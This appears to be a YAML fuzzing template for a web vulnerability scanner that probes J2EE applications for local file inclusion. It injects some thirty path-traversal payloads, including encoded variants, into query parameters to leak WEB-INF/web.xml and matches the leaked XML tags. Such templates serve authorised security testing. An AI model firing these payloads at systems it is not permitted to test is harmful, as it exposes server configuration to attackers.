http:
- fuzzing:
  - fuzz:
    - '{{injection}}'
    mode: multiple
    part: query
    type: replace
  matchers:
  - condition: and
    part: body
    type: word
    words:
    - <servlet-name>
    - </web-app>
  - condition: and
    part: body
    type: word
    words:
    - <session-config>
    - <filter>
  - condition: and
    part: body
    type: word
    words:
    - <web-app
    - </web-app
  matchers-condition: or
  method: GET
  path:
  - '{{BaseURL}}'
  payloads:
    injection:
    - '%2e/WEB-INF/web.xml'
    - '%c0%ae/%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml'
    - '%c0%ae/%c0%ae/%c0%ae/WEB-INF/web.xml'
    - '%c0%ae/%c0%ae/WEB-INF/web.xml'
    - '%c0%ae/WEB-INF/web.xml'
    - ../../../../WEB-INF/web.xml
    - ../../../WEB-INF/web.xml
    - ../../../WEB-INF/web.xml;x=
    - ../../WEB-INF/web.xml
    - ../../WEB-INF/web.xml;x=
    - ../WEB-INF/web.xml
    - ../WEB-INF/web.xml;x=
    - ../app/WEB-INF/web.xml
    - ..;/WEB-INF/web.xml
    - ..;/..;/WEB-INF/web.xml
    - .//WEB-INF/web.xml
    - /#/../../../../WEB-INF/web.xml
    - /WEB-INF/web.xml
    - ./WEB-INF/web.xml
    - ../WEB-INF/web.xml
    - /../../WEB-INF/web.xml
    - /../../../WEB-INF/web.xml
    - /../../../../WEB-INF/web.xml
    - ;/WEB-INF/web.xml
    - ./WEB-INF/.../web.xml
    - ./WEB-INF/../../../WEB-INF/web.xml
    - ./WEB-INF/../../WEB-INF/web.xml
    - ./WEB-INF/././web.xml
    - ./WEB-INF/./web.xml
    - ./WEB-INF/./xxx/../web.xml
    - ./WEB-INF/./xxx/yyy/../../web.xml
    - ./WEB-INF/web.xml
  stop-at-first-match: true
id: lfi-j2ee
info:
  author: shelled
  description: Looks for J2EE specific LFI vulnerabilities, tries to leak the web.xml
    file.
  name: J2EE LFI
  reference: https://shahjerry33.medium.com/lfi-an-interesting-tweak-9c5638dbdd1b
  severity: high
  tags: fuzzing-lfi,fuzzing-req,dast
